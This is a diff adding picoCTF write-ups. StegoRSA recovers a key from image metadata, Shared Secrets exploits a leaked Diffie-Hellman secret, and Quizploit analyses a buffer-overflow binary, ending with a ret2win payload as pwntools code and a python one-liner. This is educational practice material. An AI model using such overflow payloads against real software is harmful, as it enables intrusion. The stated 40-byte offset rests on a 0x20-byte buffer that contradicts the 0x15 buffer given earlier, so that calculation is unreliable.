@@ -1829,7 +1829,7 @@ cat flag.txt
 We get the flag
 
 
-# Flag in Flame
+## Flag in Flame
 
 Check the file type:
 ```bash
@@ -1873,7 +1873,7 @@ echo "7069636F4354467B666F72656E736963735F616E616C797369735F69735F616D617A696E67
 We get the flag.
 
 
-# Corrupted file
+## Corrupted file
 
 Check the file type:
 ```bash
@@ -1922,5 +1922,398 @@ open('fixed.jpg','wb').write(data)
 ```
 
 Opening the `fixed.jpg` gives the Flag.
+
+
+## StegoRSA
+
+Running exiftool on the image
+```bash
+exiftool image.jpg
+```
+
+Output:
+
+```text
+Comment : 2d2d2d2d2d424547494e2050524956415445204b45592d2d2d2d2d...
+```
+
+Extract the comment
+```bash
+exiftool -b -Comment image.jpg | xxd -r -p > private.pem
+```
+
+Reading the Encrypted File
+```bash
+file flag.enc
+```
+
+Output:
+```text
+flag.enc: data
+```
+
+The file is raw binary ciphertext.
+
+Now Decrypting the flag
+```bash
+openssl pkeyutl -decrypt \
+  -inkey private.pem \
+  -in flag.enc
+```
+
+We get the flag.
+
+
+## Shared Secrets
+
+The challenge uses Diffie-Hellman key exchange
+```python
+# Public parameters
+g = 2
+p = getPrime(1048)
+
+# Server's secret
+a = randint(2, p-2)
+A = pow(g, a, p)
+
+# Client secret
+b = '???'
+
+B = pow(g, b, p)
+
+# Shared key
+shared = pow(A, b, p)
+
+# Encrypt flag
+flag = b"picoCTF{...}"
+enc = bytes([x ^ (shared % 256) for x in flag])
+```
+
+The flag is encrypted using XOR with:
+```python
+shared % 256
+```
+
+The challenge leaks the following values:
+```text
+g = 2
+p = 2520609159009929347536387393563498975639833851464009529596306653948592129706406688397154482508143342649906304992943744287174782696018089880181218353683839481521675612601609781166049729597088517468177918998829464839334532869572792344076531667178728742790399860119736363722424122966218451041463273372651603890875287543
+
+A = 791451817798551421425019537796986479783064478217819080700007654115657719883729010847026029739433119883200357511186360598648834336636215127080716489172129988570782291706578657989224420772835625044632447980711080027693574429736034184510115763702267066250562670847015949330608876832707054355872881534831092459752744534
+
+b = 2214025115060717777202118390378463885971416817502000638417185263993584676072781441101216882399181123369745573814553627785271003376636927412998286834543669456582230812057167829290549630031027455783373831662247627668596197609798578004041770078906393675046891509334739674544185624487771672029509883254653684750655210027
+
+enc = 7a636965495e4c716e625579396978397e553a6e3b3f3c386f6f77
+```
+
+In Diffie-Hellman, the secret values (`a` and `b`) must never be disclosed. Because the client secret `b` is leaked, we can directly compute the shared secret:
+
+```python
+shared = pow(A, b, p)
+```
+
+By using the following script we can break it
+```python
+from Crypto.Util.number import *
+
+p = 2520609159009929347536387393563498975639833851464009529596306653948592129706406688397154482508143342649906304992943744287174782696018089880181218353683839481521675612601609781166049729597088517468177918998829464839334532869572792344076531667178728742790399860119736363722424122966218451041463273372651603890875287543
+
+A = 791451817798551421425019537796986479783064478217819080700007654115657719883729010847026029739433119883200357511186360598648834336636215127080716489172129988570782291706578657989224420772835625044632447980711080027693574429736034184510115763702267066250562670847015949330608876832707054355872881534831092459752744534
+
+b = 2214025115060717777202118390378463885971416817502000638417185263993584676072781441101216882399181123369745573814553627785271003376636927412998286834543669456582230812057167829290549630031027455783373831662247627668596197609798578004041770078906393675046891509334739674544185624487771672029509883254653684750655210027
+
+enc = bytes.fromhex("7a636965495e4c716e625579396978397e553a6e3b3f3c386f6f77")
+
+shared = pow(A, b, p)
+key = shared % 256
+
+flag = bytes([x ^ key for x in enc])
+
+print(flag.decode())
+```
+
+Finally we get the flag.
+
+
+## Quizploit
+
+Check the binary type:
+```bash
+file vuln
+```
+
+Output:
+```text
+ELF 64-bit LSB executable, x86-64
+```
+
+### Question 1
+**Is this a 32-bit or 64-bit ELF?**
+
+Answer:
+```text
+64-bit
+```
+
+### Question 2
+**What's the linking of the binary?**
+
+Answer:
+```text
+dynamic
+```
+
+The binary uses standard C library functions such as:
+* fprintf
+* fgets
+* system
+
+This indicates dynamic linking.
+
+Check:
+```bash
+file vuln
+```
+
+### Question 3
+**Is the binary stripped or not stripped?**
+
+Answer:
+```text
+not stripped
+```
+
+Symbols are present, so the binary is not stripped.
+
+
+### Question 4
+**Buffer size?**
+
+Answer:
+```text
+0x15
+```
+
+Inspecting the source code reveals:
+```c
+char buffer[0x15];
+```
+
+
+### Question 5
+**How many bytes are read?**
+
+Answer:
+```text
+0x90
+```
+
+The program reads:
+```c
+fgets(buffer, 0x90, stdin);
+```
+
+### Question 6
+**Is there a buffer overflow vulnerability?**
+
+Answer:
+```text
+yes
+```
+
+Since:
+```text
+Buffer size = 0x15
+Input size  = 0x90
+```
+
+More bytes are read than the buffer can hold.
+
+### Question 7
+**Name a standard C function that could cause a buffer overflow.**
+
+Answer:
+```text
+fgets
+```
+
+The vulnerable function is:
+
+```c
+fgets()
+```
+
+because it reads far more bytes than the buffer can hold.
+
+### Question 8
+**Which function is not called anywhere in the program?**
+
+Answer:
+```text
+win
+```
+
+The source contains:
+
+```c
+void win()
+{
+    ...
+}
+```
+but it is never called.
+
+### Question 9
+**What type of attack could exploit this vulnerability?**
+
+Answer:
+```text
+buffer overflow
+```
+
+### Question 10
+**How many bytes of overflow are possible?**
+
+Answer:
+```text
+0x7b
+```
+
+The vulnerability is caused by writing beyond the buffer boundary.
+
+Buffer:
+```text
+0x15 bytes
+```
+
+Input:
+```text
+0x90 bytes
+```
+
+Overflow:
+```text
+0x90 - 0x15 = 0x7b
+```
+
+### Question 11
+**What protection is enabled?**
+
+Answer:
+```text
+NX
+```
+
+Run:
+```bash
+checksec --file=./vuln
+```
+
+Output:
+```text
+RELRO: Partial RELRO
+Stack: No canary found
+NX: NX enabled
+PIE: No PIE
+SHSTK: Enabled
+IBT: Enabled
+Stripped: No
+```
+
+### Question 12
+**What technique could bypass NX?**
+
+Answer:
+```text
+ROP
+```
+
+### Question 13
+**Address of win()?**
+
+Answer:
+```text
+0x401176
+```
+
+
+NX prevents execution of injected shellcode on the stack.
+
+The standard bypass is:
+```text
+ROP
+```
+
+(Return-Oriented Programming)
+
+
+Using `nm`:
+
+```bash
+nm vuln | grep " win"
+```
+
+Output:
+```text
+0000000000401176 T win
+```
+
+Using `objdump`:
+
+```bash
+objdump -d vuln | grep "<win>"
+```
+
+Output:
+```text
+0000000000401176 <win>:
+```
+
+Using `gdb`:
+```bash
+gdb ./vuln
+info functions win
+```
+
+Output:
+```text
+0x0000000000401176 win
+```
+
+
+The challenge only required answering questions, but the binary is a classic ret2win challenge.
+
+
+```text
+buffer      = 0x20 bytes
+saved RBP   = 8 bytes
+saved RIP   = target
+```
+
+Offset to RIP:
+
+```text
+0x20 + 0x8 = 40 bytes
+```
+
+Exploit payload:
+
+```python
+from pwn import *
+
+payload = b"A"*40
+payload += p64(0x401176)
+```
+
+or:
+
+```bash
+python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*40 + struct.pack("<Q",0x401176))'
+```
+
+This would redirect execution to the `win()` function.
+
+
+Finally we get the flag after answering all questions.
 
 
